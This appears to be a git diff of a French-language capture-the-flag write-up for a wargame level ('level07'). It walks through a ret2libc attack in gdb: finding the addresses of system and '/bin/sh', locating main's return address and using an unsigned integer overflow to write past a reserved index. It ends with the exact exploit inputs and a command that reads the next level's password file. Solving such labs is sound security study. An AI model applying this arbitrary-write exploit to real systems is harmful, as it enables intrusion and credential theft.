@@ -1,6 +1,12 @@
-adresse de /bin/sh
+On décompile le programme, et on voit un programme de mauvais stockage de nombre. On voit que la fonction pour
+stocker les nombres permet d'écrire n'importe où en mémoire. On décide donc d'écrire un appel à system à la place
+de l'adresse de retour de main, suivi d'une adresse vers "/bin/sh" avec 4 octets de padding. 
+
+On trouve l'adresse de /bin/sh
 (gdb) find 0xf7e2c000, 0xf7fcc000, "/bin/sh"
 0xf7f897ec
+
+On trouve l'adresse de la fonction system
 (gdb) info function "system"
 All functions matching regular expression "system":
 
@@ -12,9 +18,68 @@ Non-debugging symbols:
 décomp, on voit que avec store, on peut écrire où on veut, on va changer adresse de retour dans la stack de main
 pour aller dans system, on réécrit aussi 4 octets plus loin l'adresse de "/bin/sh"
 
-il faut trouver l'adresse d'array, et l'adresse de l'adresse de retour sur la stack
+Il faut trouver l'adresse d'array, et l'adresse de l'adresse de retour sur la stack
 en lisant asm, on trouve array à 0x08(%ebp) dans la fun store_number 
 (gdb) x/x $ebp + 0x8
 0xffffd530:     0xffffd554
 
-0xffffd708
+Il faut maintenant trouver l'adresse de retour sur la stack. 
+
+La fonction appelante de la fonction main est la fonction start. On cherche l'adresse de cette fonction, pour 
+trouver quelque chose de similaire sur la stack. 
+
+(gdb) info function start
+All functions matching regular expression "start":
+
+Non-debugging symbols:
+0x080484d0  __gmon_start__
+0x080484d0  __gmon_start__@plt
+0x080484e0  __libc_start_main
+0x080484e0  __libc_start_main@plt
+0x08048510  _start
+0xf7e45420  __libc_start_main
+0xf7f1d9c0  __monstartup
+0xf7f1d9c0  monstartup
+
+On sait que l'array est à l'addresse 0xffffd554, et fait 400 octets. On cherche donc l'adresse de retour vers
+0xffffd6e4
+(gdb) x/20x 0xffffd6e4
+0xffffd6e4:     0x00000001      0x00000000      0x00000000      0x00000000
+0xffffd6f4:     0x00000000      0x00000000      0x0e4d4800      0xf7feb620
+0xffffd704:     0x00000000      0x08048a09      0xf7fceff4      0x00000000
+0xffffd714:     0x00000000      0x00000000      0xf7e45513      0x00000001
+0xffffd724:     0xffffd7b4      0xffffd7bc      0xf7fd3000      0x00000000
+
+On voit que la valeur à l'adresse 0xffffd71c ressemble à l'adresse de début de __libc_start_main; ça doit donc 
+être l'adresse de retour de main. 
+
+On a donc l'adresse de début de l'array, et l'adresse de retour sur la stack. On fait la différence entre les 
+deux, et on divise par 4 pour obtenir l'index que l'on va devoir utiliser pour écrire à cet endroit avec la 
+commande store du programme
+(0xffffd71c - 0xffffd554) / 4 = 0x72 = 114
+On doit donc écrire l'adresse de system à l'index 114, or c'est un multiple de 3, et le programme nous dit que 
+c'est réservé à Wil. Pour contourner ça, il suffit suffit de faire un overflow de la variable, avec uint_max. 
+On prend donc ceil(uint_max / 4 + 114) = 1073741938
+
+L'attaque sera donc comme suit
+store
+adresse de system (f7e6aed0 = 4159090384)
+l'index overflowé (1073741938)
+
+store
+adresse de "/bin/sh" (0xf7f897ec=4160264172)
+2 plus loin que l'index où on a écrit system (114+2 = 116)
+
+Voici les strings d'attaque :
+
+./level07
+store
+4159090384
+1073741938
+
+store
+4160264172
+116
+
+quit
+cat /home/users/level08/.pass
